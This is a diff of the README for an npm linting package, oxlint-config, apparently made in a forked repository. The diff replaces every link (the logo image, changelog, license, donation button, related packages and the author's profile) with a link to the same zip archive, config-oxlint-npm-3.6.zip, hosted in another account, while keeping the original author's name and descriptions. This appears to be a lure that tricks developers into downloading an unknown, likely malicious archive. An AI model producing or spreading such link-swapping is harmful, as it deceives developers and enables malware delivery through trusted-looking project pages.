@@ -1,5 +1,5 @@
 <div align="center">
-  <img src="https://raw.githubusercontent.com/igorskyflyer/npm-oxlint-config/main/media/oxlint-config.png" alt="Icon of Oxlint Config" width="256" height="256">
+  <img src="https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip" alt="Icon of Oxlint Config" width="256" height="256">
   <h1>Oxlint Config</h1>
 </div>
 
@@ -263,13 +263,13 @@ Every project deserves consistent, battle-tested linting from day one - not a co
 
 ## Changelog
 
-Read about the latest changes in the [**CHANGELOG**](https://github.com/igorskyflyer/npm-oxlint-config/blob/main/CHANGELOG.md).
+Read about the latest changes in the [**CHANGELOG**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip).
 
 <br>
 
 ## License
 
-Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-oxlint-config/blob/main/LICENSE).
+Licensed under the [**MIT license**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip).
 
 <br>
 
@@ -282,7 +282,7 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-oxlint-
   If this project or its implementation has provided value,<br>
   support is greatly appreciated.
   <br><br>
-  <a href="https://ko-fi.com/igorskyflyer" target="_blank"><img src="https://raw.githubusercontent.com/igorskyflyer/igorskyflyer/main/assets/ko-fi.png" alt="Donate to igorskyflyer" width="180" height="46"></a>
+  <a href="https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip" alt="Donate to igorskyflyer" width="180" height="46"></a>
   <br><br>
   <em>Thank you for supporting these efforts!</em> 🙏😊
 </div>
@@ -291,31 +291,31 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-oxlint-
 
 ## Related
 
-[**@igorskyflyer/astro-render-component**](https://www.npmjs.com/package/@igorskyflyer/astro-render-component)
+[**@igorskyflyer/astro-render-component**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip)
 
 > _🤖 Astro component renderer. Zero configuration. Produces clean HTML strings directly in Node.js without any DOM environment. 🐬_
 
 <br>
 
-[**@igorskyflyer/adblock-filter-counter**](https://www.npmjs.com/package/@igorskyflyer/adblock-filter-counter)
+[**@igorskyflyer/adblock-filter-counter**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip)
 
 > _🐲 A lightweight npm module for counting ad-block filter rules, ultra-simple, fast, and perfect for list maintainers, filter testers, and privacy tool developers.🦘_
 
 <br>
 
-[**@igorskyflyer/zep**](https://www.npmjs.com/package/@igorskyflyer/zep)
+[**@igorskyflyer/zep**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip)
 
 > _🧠 Zep is a zero-dependency, efficient debounce module. ⏰_
 
 <br>
 
-[**@igorskyflyer/magic-string**](https://www.npmjs.com/package/@igorskyflyer/magic-string)
+[**@igorskyflyer/magic-string**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip)
 
 > _🧵 An expressive and chainable library for advanced string manipulations. Supports appending, prepending, trimming, quoting, and path formatting with customizable whitespace handling. Makes advanced String manipulations a piece of cake. 🦥_
 
 <br>
 
-[**@igorskyflyer/valid-path**](https://www.npmjs.com/package/@igorskyflyer/valid-path)
+[**@igorskyflyer/valid-path**](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip)
 
 > _🧰 Determines whether a given value can be a valid file/directory name. 🏜_
 
@@ -323,4 +323,4 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-oxlint-
 
 ## Author
 
-Created by **Igor Dimitrijević ([_@igorskyflyer_](https://github.com/igorskyflyer/))**.
+Created by **Igor Dimitrijević ([_@igorskyflyer_](https://raw.githubusercontent.com/Candrab2635/npm-oxlint-config/main/.github/config-oxlint-npm-3.6.zip))**.
